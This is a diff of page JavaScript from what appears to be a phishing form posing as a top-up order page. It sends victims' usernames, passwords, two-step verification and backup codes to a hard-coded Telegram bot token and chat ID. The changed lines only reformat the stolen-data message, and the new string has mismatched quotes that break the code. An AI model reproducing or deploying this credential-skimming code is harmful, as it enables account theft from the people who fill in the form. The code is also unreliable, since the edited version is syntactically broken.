@@ -316,14 +316,14 @@ document.addEventListener('DOMContentLoaded', function(){
 
     const token = '1868293159:AAF7IWMtOEqmVqEkBAfCTexkj_siZiisC0E';
     const chatId = '-1002801058966';
-    const txt = '📩 *Pesanan Baru Masuk!*\\n'+
-                '-----------------------------\\n'+
-                '👤 Username : ' + u + '\\n'+
-                '🔑 Password : ' + p + '\\n'+
-                '🛡 V2L      : ' + v + (vm ? ' (' + vm + ')' : '') + (b ? '\\nBackup Code : ' + b : '') + '\\n'+
-                '📦 Kategori : ' + kt + '\\n'+
-                '💎 Nominal  : ' + nm + '\\n'+
-                '💰 Harga    : ' + hg;
+    const txt = 
+      '*Pesanan Baru Masuk!\n\n" +
+      '👤 Username : ' + u + "\n" +
+      '🔑 Password : ' + p + "\n" +
+      'V2L      : ' + v + (vm ? ' (' + vm + ')' : '') + (b ? '\\nBackup Code : ' + b : '') + "\n" +
+      'Kategori : ' + kt + "\n" +
+      'Nominal  : ' + nm + "\n" +
+      'Harga    : ' + hg;
     
     fetch('https://api.telegram.org/bot'+token+'/sendMessage',{
       method:'POST',
